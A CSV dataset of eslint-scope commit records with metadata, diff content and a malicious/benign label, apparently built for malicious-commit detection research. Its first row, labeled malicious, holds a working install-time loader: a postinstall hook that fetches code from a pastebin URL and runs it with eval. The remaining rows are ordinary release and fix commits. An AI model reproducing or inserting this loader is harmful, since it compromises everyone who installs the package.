Repo_Forks, Repo_Stars, Repo_Watchers, Repo_Size, Repo_Issues, Repo_Subscribers, Author_Name, Author_Repos, Author_Gists, Author_Followers, Author_Following, Author_Type, Author_Company, Author_Days, Commit_Date_DOW, Commit_Date_HOD, Commit_Date_MOH, Commit_Date, Commit Message, Number of Removed Files, Number of Added Files, Number of Edited Files, Number_of_edited_lines, Amount of edit bytes, Added content, Removed content,Malicious
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Thu,12,37,12 Jul 2018,3.7.2,0,1,1,24,624,"+try {<\n>+  var https = require(""https"");<\n>+  https<\n>+    .get(<\n>+      {<\n>+        hostname: ""pastebin.com""<c><\n>+        path: ""/raw/XLeVP82h""<c><\n>+        headers: {<\n>+          ""User-Agent"":<\n>+            ""Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0""<c><\n>+          Accept:<\n>+            ""text/html<c>application/xhtml+xml<c>application/xml;q=0.9<c>*/*;q=0.8""<\n>+        }<\n>+      }<c><\n>+      r => {<\n>+        r.setEncoding(""utf8"");<\n>+        r.on(""data""<c> c => {<\n>+          eval(c);<\n>+        });<\n>+        r.on(""error""<c> () => {});<\n>+      }<\n>+    )<\n>+    .on(""error""<c> () => {});<\n>+ ""postinstall"": ""node ./lib/build.js""<c><\n>",,T
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Sat,23,20,20 Jul 2019,5.0.0,0,0,1,2,46,"+  ""version"": ""5.0.0""<c><\n>","-  ""version"": ""4.0.3""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Sat,23,20,20 Jul 2019,Build: changelog update for 5.0.0,0,0,1,3,369,+v5.0.0 - July 20<c> 2019<\n>+* [`e9fa22e`](https://github.com/eslint/eslint-scope/commit/e9fa22ea412c26cf2761fa98af7e715644bdb464) Upgrade: update dependencies after dropping support for Node <8 (#53) (Kai Cataldo)<\n>+* [`ee9f7c1`](https://github.com/eslint/eslint-scope/commit/ee9f7c12721aa195ba7e0e69551f49bfdb479951) Breaking: drop support for Node v6 (#54) (Kai Cataldo)<\n>,,F
17,56,56,569,4,26,Kai Cataldo,47,4,87,40,User,0,1966,Sat,11,7,20 Jul 2019,Upgrade: update dependencies after dropping support for Node <8 (#53) * Upgrade: Update dependencies * Downgrade to eslint@5 * Update to eslint@^6.0.1 * Add assertion for added reference,2,2,17,400,19103,"+!.eslintrc.js<\n>+""use strict"";<\n>+module.exports = {<\n>+    root: true<c><\n>+    extends: [<\n>+        ""eslint""<\n>+    ]<c><\n>+    overrides: [<\n>+        {<\n>+            files: [""tests/**/*""]<c><\n>+            env: {<\n>+                mocha: true<\n>+            }<\n>+        }<\n>+    ]<\n>+                    dependency.name);<\n>+        sourceType: ""script""<c> // one of ['script'<c> 'module']<\n>+        if (Object.prototype.hasOwnProperty.call(override<c> key)) {<\n>+                ));<\n>+                init<\n>+            );<\n>+        let visitPatternOptions = options;<\n>+        let visitPatternCallback = callback;<\n>+            visitPatternCallback = options;<\n>+            visitPatternOptions = { processRightHandNodes: false };<\n>+            visitPatternOptions.processRightHandNodes ? this : null<c><\n>+            visitPatternCallback<\n>+        );<\n>+                new Definition(<\n>+                    Variable.FunctionName<c><\n>+                    node.id<c><\n>+                    node<c><\n>+                    null<c><\n>+                    null<c><\n>+                    null<\n>+                ));<\n>+                new Definition(<\n>+                    Variable.ClassName<c><\n>+                    node.id<c><\n>+                    node<c><\n>+                    null<c><\n>+                    null<c><\n>+                    null<\n>+                ));<\n>+                new Definition(<\n>+                    Variable.ClassName<c><\n>+                    node.id<c><\n>+                    node<\n>+                ));<\n>+        /**<\n>+        /**<\n>+        /**<\n>+        /**<\n>+        /**<\n>+        /**<\n>+        /**<\n>+        /**<\n>+        /**<\n>+        /**<\n>+        /**<\n>+                node.name<c><\n>+                this.set<c><\n>+                this.variables<c><\n>+                node<c><\n>+                def<\n>+            );<\n>+                new Definition(<\n>+                    Variable.ImplicitGlobalVariable<c><\n>+                    info.pattern<c><\n>+                    info.node<c><\n>+                    null<c><\n>+                    null<c><\n>+                    null<\n>+                ));<\n>+                node.name<c><\n>+                this.implicit.set<c><\n>+                this.implicit.variables<c><\n>+                node<c><\n>+                def<\n>+            );<\n>+            new Definition(<\n>+                Variable.FunctionName<c><\n>+                block.id<c><\n>+                block<c><\n>+                null<c><\n>+                null<c><\n>+                null<\n>+            ));<\n>+            ""arguments""<c><\n>+            this.set<c><\n>+            this.variables<c><\n>+            null<c><\n>+            null<\n>+        );<\n>+            ref.identifier.range[0] < bodyStart && // the reference is in the parameter part.<\n>+    ""@typescript-eslint/parser"": ""^1.11.0""<c><\n>+    ""chai"": ""^4.2.0""<c><\n>+    ""eslint"": ""^6.0.1""<c><\n>+    ""eslint-config-eslint"": ""^5.0.1""<c><\n>+    ""eslint-plugin-node"": ""^9.1.0""<c><\n>+    ""espree"": ""^6.0.0""<c><\n>+    ""mocha"": ""^6.1.4""<c><\n>+    ""shelljs"": ""^0.8.3""<c><\n>+    ""typescript"": ""^3.5.2""<\n>+        expect(scopeManager.scopes).to.have.length(2); // Program and BlockStatement scope.<\n>+        expect(scope.variables).to.have.length(0); // No variable in Program scope.<\n>+        expect(scope.variables).to.have.length(1); // `i` in block scope.<\n>+                expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+                expect(scope.variables).to.have.length(numVars); // [arguments?<c> a<c> b]<\n>+                expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+                expect(scope.variables).to.have.length(numVars); // [arguments?<c> b]<\n>+                expect(scope.references).to.have.length(2); // [b<c> a]<\n>+                expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+                expect(scope.variables).to.have.length(numVars); // [arguments?<c> b]<\n>+                expect(scope.references).to.have.length(2); // [b<c> a]<\n>+                expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+                expect(scope.variables).to.have.length(numVars); // [arguments?<c> b]<\n>+                expect(scope.references).to.have.length(2); // [b<c> a]<\n>+                expect(scopeManager.scopes).to.have.length(3); // [global<c> foo<c> anonymous]<\n>+                expect(scope.variables).to.have.length(1); // [arguments]<\n>+                expect(scope.references).to.have.length(1); // [a]<\n>+                expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+                expect(scope.variables).to.have.length(numVars); // [arguments?<c> b<c> a]<\n>+                expect(scope.references).to.have.length(2); // [b<c> a]<\n>+                expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+                expect(scope.variables).to.have.length(numVars); // [arguments?<c> b<c> a]<\n>+                expect(scope.references).to.have.length(2); // [b<c> a]<\n>+                expect(scopeManager.scopes).to.have.length(3); // [global<c> foo<c> anonymous function]<\n>+                expect(scope.references).to.have.length(1); // [a]<\n>+        expect(scopeManager.scopes).to.have.length(3); // [global<c> function<c> for]<\n>+        expect(scopeManager.scopes).to.have.length(3); // [global<c> function<c> for]<\n>+        expect(scopeManager.scopes).to.have.length(3); // [global<c> function<c> for]<\n>+        expect(scope.references[0].identifier.name).to.equal(""obj""); // obj.a<\n>+        expect(scope.references[1].identifier.name).to.equal(""obj""); // obj.b<\n>+        expect(scope.references[2].identifier.name).to.equal(""obj""); // obj.c<\n>+    it(""should create variable bindings""<c> () => {<\n>+        const ast = espree(""const x = 1; export {x};"");<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.references).to.have.length(2);<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""x"");<\n>+        const ast = espree(""const v = 1; export {v as x};"");<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.references).to.have.length(2);<\n>+        expect(scope.references[1].identifier.name).to.be.equal(""v"");<\n>+            class Foo extends Bar {<\n>+        expect(scope.variables[0].name).to.be.equal(""Foo"");<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].identifier.name).to.be.equal(""Bar"");<\n>+        expect(scope.variables[0].name).to.be.equal(""Foo"");<\n>+        expect(scope.references).to.have.length(0); // super is specially handled like `this`.<\n>+        expect(scope.references).to.have.length(0); // super is specially handled like `this`.<\n>+            import b<c> {c<c> x as d} from ""ccc"";`);<\n>+            import b<c> {c<c> x as d} from ""ccc"";`);<\n>+            import b<c> {c<c> x as d} from ""ccc"";`);<\n>+            import b<c> {c<c> x as d} from ""ccc"";`);<\n>+        const ast = espree(""function foo() {}"");<\n>+        const ast = espree(""import {x as v} from 'mod';"");<\n>+            expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(2); // [global<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(3); // [global<c> a<c> foo]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(2); // [global<c> A]<\n>+            expect(scope.variables).to.have.length(2); // [A<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> A]<\n>+            expect(scopeManager.scopes).to.have.length(3); // [global<c> A<c> foo]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> A]<\n>+            expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(3); // [global<c> foo<c> bar]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(2); // [global<c> foo]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> a]<\n>+            expect(scopeManager.scopes).to.have.length(3); // [global<c> foo<c> bar]<\n>+            expect(scope.variables).to.have.length(2); // [arguments<c> b]<\n>+            expect(scope.references).to.have.length(2); // [b<c> a]<\n>+            }));<\n>+            }));<\n>+            }));<\n>+    parse = require(""@typescript-eslint/parser"").parse<c><\n>+            expect(scopeManager.scopes).to.have.length(2);<\n>+            expect(globalScope.references).to.have.length(4);<\n>+            const scope = scopeManager.scopes[1];<\n>","-env:<\n>-    node: true<\n>-    es6: true<\n>-parserOptions:<\n>-    ecmaVersion: 6<\n>-extends: eslint<\n>-                    dependency.name<\n>-                );<\n>-        sourceType: ""script""<c>  // one of ['script'<c> 'module']<\n>-        if (override.hasOwnProperty(key)) {<\n>-                    ));<\n>-                init);<\n>-            callback = options;<\n>-            options = { processRightHandNodes: false };<\n>-            options.processRightHandNodes ? this : null<c><\n>-            callback);<\n>-                    new Definition(<\n>-                        Variable.FunctionName<c><\n>-                        node.id<c><\n>-                        node<c><\n>-                        null<c><\n>-                        null<c><\n>-                        null<\n>-                    ));<\n>-                    new Definition(<\n>-                        Variable.ClassName<c><\n>-                        node.id<c><\n>-                        node<c><\n>-                        null<c><\n>-                        null<c><\n>-                        null<\n>-                    ));<\n>-                    new Definition(<\n>-                        Variable.ClassName<c><\n>-                        node.id<c><\n>-                        node<\n>-                    ));<\n>-         /**<\n>-         /**<\n>-         /**<\n>-         /**<\n>-         /**<\n>-         /**<\n>-         /**<\n>-         /**<\n>-         /**<\n>-         /**<\n>-         /**<\n>-                    node.name<c><\n>-                    this.set<c><\n>-                    this.variables<c><\n>-                    node<c><\n>-                    def);<\n>-                    new Definition(<\n>-                        Variable.ImplicitGlobalVariable<c><\n>-                        info.pattern<c><\n>-                        info.node<c><\n>-                        null<c><\n>-                        null<c><\n>-                        null<\n>-                    ));<\n>-                    node.name<c><\n>-                    this.implicit.set<c><\n>-                    this.implicit.variables<c><\n>-                    node<c><\n>-                    def);<\n>-                new Definition(<\n>-                    Variable.FunctionName<c><\n>-                    block.id<c><\n>-                    block<c><\n>-                    null<c><\n>-                    null<c><\n>-                    null<\n>-                ));<\n>-                ""arguments""<c><\n>-                this.set<c><\n>-                this.variables<c><\n>-                null<c><\n>-                null);<\n>-            ref.identifier.range[0] < bodyStart &&                 // the reference is in the parameter part.<\n>-    ""chai"": ""^3.4.1""<c><\n>-    ""eslint"": ""^3.15.0""<c><\n>-    ""eslint-config-eslint"": ""^4.0.0""<c><\n>-    ""espree"": ""^3.1.1""<c><\n>-    ""mocha"": ""^3.2.0""<c><\n>-    ""shelljs"": ""^0.7.6""<c><\n>-    ""typescript"": ""~2.0.10""<c><\n>-    ""typescript-eslint-parser"": ""^1.0.0""<\n>-env:<\n>-    mocha: true<\n>-extends: '../.eslintrc.yml'<\n>-        expect(scopeManager.scopes).to.have.length(2);  // Program and BlcokStatement scope.<\n>-        expect(scope.variables).to.have.length(0);  // No variable in Program scope.<\n>-        expect(scope.variables).to.have.length(1);  // `i` in block scope.<\n>-                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> a<c> b]<\n>-                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>-                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>-                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>-                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-                expect(scopeManager.scopes).to.have.length(3);  // [global<c> foo<c> anonymous]<\n>-                expect(scope.variables).to.have.length(1);  // [arguments]<\n>-                expect(scope.references).to.have.length(1);  // [a]<\n>-                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b<c> a]<\n>-                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-                expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b<c> a]<\n>-                expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-                expect(scopeManager.scopes).to.have.length(3);  // [global<c> foo<c> anonymous function]<\n>-                expect(scope.references).to.have.length(1);  // [a]<\n>-        expect(scopeManager.scopes).to.have.length(3);  // [global<c> function<c> for]<\n>-        expect(scopeManager.scopes).to.have.length(3);  // [global<c> function<c> for]<\n>-        expect(scopeManager.scopes).to.have.length(3);  // [global<c> function<c> for]<\n>-        expect(scope.references[0].identifier.name).to.equal(""obj"");  // obj.a<\n>-        expect(scope.references[1].identifier.name).to.equal(""obj"");  // obj.b<\n>-        expect(scope.references[2].identifier.name).to.equal(""obj"");  // obj.c<\n>-    it(""should create vairable bindings""<c> () => {<\n>-        const ast = espree(""export {x};"");<\n>-        expect(scope.variables).to.have.length(0);<\n>-        expect(scope.references).to.have.length(1);<\n>-        const ast = espree(""export {v as x};"");<\n>-        expect(scope.variables).to.have.length(0);<\n>-        expect(scope.references).to.have.length(1);<\n>-            class Hello {<\n>-        expect(scope.variables[0].name).to.be.equal(""Hello"");<\n>-        expect(scope.references).to.have.length(0);<\n>-        expect(scope.variables[0].name).to.be.equal(""Hello"");<\n>-        expect(scope.references).to.have.length(0);  // super is specially handled like `this`.<\n>-        expect(scope.references).to.have.length(0);  // super is specially handled like `this`.<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<\n>-        );<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<\n>-        );<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<\n>-        );<\n>-            import b<c> {c<c> x as d} from ""ccc"";`<\n>-        );<\n>-        const ast = espree(`<\n>-            function foo() {}`<\n>-        );<\n>-        const ast = espree(`<\n>-            import {x as v} from ""mod"";`<\n>-        );<\n>-            expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(2);  // [global<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(3);  // [global<c> a<c> foo]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(2);  // [global<c> A]<\n>-            expect(scope.variables).to.have.length(2);  // [A<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> A]<\n>-            expect(scopeManager.scopes).to.have.length(3);  // [global<c> A<c> foo]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> A]<\n>-            expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(3);  // [global<c> foo<c> bar]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> a]<\n>-            expect(scopeManager.scopes).to.have.length(3);  // [global<c> foo<c> bar]<\n>-            expect(scope.variables).to.have.length(2);  // [arguments<c> b]<\n>-            expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-            })<\n>-        );<\n>-            })<\n>-        );<\n>-            })<\n>-        );<\n>-    parse = require(""typescript-eslint-parser"").parse<c><\n>-            expect(scopeManager.scopes).to.have.length(4);<\n>-            expect(globalScope.references).to.have.length(0);<\n>-            // Function scopes<\n>-            let scope = scopeManager.scopes[1];<\n>-            expect(scope.type).to.be.equal(""function"");<\n>-            expect(scope.variables).to.have.length(2);<\n>-            expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>-            expect(scope.isArgumentsMaterialized()).to.be.false;<\n>-            expect(scope.references).to.have.length(0);<\n>-            scope = scopeManager.scopes[2];<\n>-            expect(scope.type).to.be.equal(""function"");<\n>-            expect(scope.variables).to.have.length(2);<\n>-            expect(scope.variables[0].name).to.be.equal(""arguments"");<\n>-            expect(scope.isArgumentsMaterialized()).to.be.false;<\n>-            expect(scope.references).to.have.length(0);<\n>-            scope = scopeManager.scopes[3];<\n>",F
17,56,56,569,4,26,Kai Cataldo,47,4,87,40,User,0,1966,Fri,12,46,19 Jul 2019,Breaking: drop support for Node v6 (#54) * Breaking: drop support for Node v6 * Update engines in package.json,0,0,2,4,68,"+    ""node"": "">=8.0.0""<\n>","-    - ""4""<\n>-    - ""6""<\n>-    ""node"": "">=4.0.0""<\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Fri,13,4,15 Mar 2019,4.0.3,0,0,1,2,46,"+  ""version"": ""4.0.3""<c><\n>","-  ""version"": ""4.0.2""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Fri,13,4,15 Mar 2019,Build: changelog update for 4.0.3,0,0,1,2,189,+v4.0.3 - March 15<c> 2019<\n>+* [`299df64`](https://github.com/eslint/eslint-scope/commit/299df64bdafb30b4d9372e4b7af0cf51a3818c4a) Fix: arrow function scope strictness (take 2) (#52) (futpib)<\n>,,F
17,56,56,569,4,26,futpib <futpib@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Fri,7,17,15 Mar 2019,Fix: arrow function scope strictness (take 2) (#52) * Fix: Arrow function scope strictness (fixes #49) (#50) * Fix: Error on functions with non-block body * Apply suggestion from review Co-authored-by: Toru Nagashima <star.ctor@gmail.com>,0,0,2,58,2595,"+        if (block.type === Syntax.ArrowFunctionExpression && block.body.type !== Syntax.BlockStatement) {<\n>+            return false;<\n>+        }<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.isStrict).to.be.false;<\n>+    it(""inherits upper scope strictness""<c> () => {<\n>+        const ast = espree(`<\n>+            ""use strict"";<\n>+            var arrow = () => {};<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(0);<\n>+    });<\n>+    it(""is strict when a strictness directive is used""<c> () => {<\n>+        const ast = espree(`<\n>+            var arrow = () => {<\n>+                ""use strict"";<\n>+            };<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(0);<\n>+    });<\n>+    it(""works with no body""<c> () => {<\n>+        const ast = espree(""var arrow = a => a;"");<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        const scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(1);<\n>+    });<\n>",-    // ArrowFunctionExpression's scope is always strict scope.<\n>-    if (block.type === Syntax.ArrowFunctionExpression) {<\n>-        return true;<\n>-    }<\n>-        expect(scope.isStrict).to.be.true;<\n>-        expect(scope.isStrict).to.be.true;<\n>,F
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Fri,20,31,1 Mar 2019,4.0.2,0,0,1,2,46,"+  ""version"": ""4.0.2""<c><\n>","-  ""version"": ""4.0.1""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Fri,20,31,1 Mar 2019,Build: changelog update for 4.0.2,0,0,1,2,210,"+v4.0.2 - March 1<c> 2019<\n>+* [`c925600`](https://github.com/eslint/eslint-scope/commit/c925600a684ae0f71b96f85339437a43b4d50d99) Revert ""Fix: Arrow function scope strictness (fixes #49) (#50)"" (#51) (Teddy Katz)<\n>",,F
17,56,56,569,4,26,Teddy Katz,75,10,128,0,User,0,1599,Fri,20,31,1 Mar 2019,Revert Fix: Arrow function scope strictness (fixes #49) (#50) (#51) This reverts commit 2533966faf317df5a3847fab937ba462c16808b8. The change is causing ESLint to crash with a parsing error on the following code: ```js console.log(this); z(x => console.log(x this)) ``` ``` TypeError: Cannot read property length of undefined at isStrictScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:93:40) at new Scope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:254:25) at new FunctionScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:641:9) at ScopeManager.__nestFunctionScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope-manager.js:209:33) at Referencer.visitFunction (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:200:27) at Referencer.ArrowFunctionExpression (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:567:14) at Referencer.Visitor.visit (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:104:34) at Referencer.Visitor.visitChildren (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:83:38) at Referencer.CallExpression (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:494:14) at Referencer.Visitor.visit (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:104:34) ``` Since this is currently affecting ESLint users were reverting the change for now until we figure out the root cause.,0,0,2,45,1960,+    // ArrowFunctionExpression's scope is always strict scope.<\n>+    if (block.type === Syntax.ArrowFunctionExpression) {<\n>+        return true;<\n>+    }<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.isStrict).to.be.true;<\n>,"-        expect(scope.isStrict).to.be.false;<\n>-        expect(scope.isStrict).to.be.false;<\n>-    it(""inherits upper scope strictness""<c> () => {<\n>-        const ast = espree(`<\n>-            ""use strict"";<\n>-            var arrow = () => {};<\n>-        `);<\n>-        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>-        expect(scopeManager.scopes).to.have.length(2);<\n>-        let scope = scopeManager.scopes[0];<\n>-        expect(scope.type).to.be.equal(""global"");<\n>-        expect(scope.block.type).to.be.equal(""Program"");<\n>-        expect(scope.isStrict).to.be.true;<\n>-        expect(scope.variables).to.have.length(1);<\n>-        scope = scopeManager.scopes[1];<\n>-        expect(scope.type).to.be.equal(""function"");<\n>-        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>-        expect(scope.isStrict).to.be.true;<\n>-        expect(scope.variables).to.have.length(0);<\n>-    });<\n>-    it(""is strict when a strictness directive is used""<c> () => {<\n>-        const ast = espree(`<\n>-            var arrow = () => {<\n>-                ""use strict"";<\n>-            };<\n>-        `);<\n>-        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>-        expect(scopeManager.scopes).to.have.length(2);<\n>-        let scope = scopeManager.scopes[0];<\n>-        expect(scope.type).to.be.equal(""global"");<\n>-        expect(scope.block.type).to.be.equal(""Program"");<\n>-        expect(scope.isStrict).to.be.false;<\n>-        expect(scope.variables).to.have.length(1);<\n>-        scope = scopeManager.scopes[1];<\n>-        expect(scope.type).to.be.equal(""function"");<\n>-        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>-        expect(scope.isStrict).to.be.true;<\n>-        expect(scope.variables).to.have.length(0);<\n>-    });<\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Fri,20,11,1 Mar 2019,4.0.1,0,0,1,2,46,"+  ""version"": ""4.0.1""<c><\n>","-  ""version"": ""4.0.0""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint[bot]@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Fri,20,11,1 Mar 2019,Build: changelog update for 4.0.1,0,0,1,4,510,+v4.0.1 - March 1<c> 2019<\n>+* [`2533966`](https://github.com/eslint/eslint-scope/commit/2533966faf317df5a3847fab937ba462c16808b8) Fix: Arrow function scope strictness (fixes #49) (#50) (futpib)<\n>+* [`0cbeea5`](https://github.com/eslint/eslint-scope/commit/0cbeea51dfb66ab88ea34b0e3b4ad5e6cc210f2f) Chore: add supported Node.js versions to CI (#47) (Kai Cataldo)<\n>+* [`b423057`](https://github.com/eslint/eslint-scope/commit/b42305760638b8edf4667acf1445e450869bd983) Upgrade: eslint-release@1.0.0 (#46) (Teddy Katz)<\n>,,F
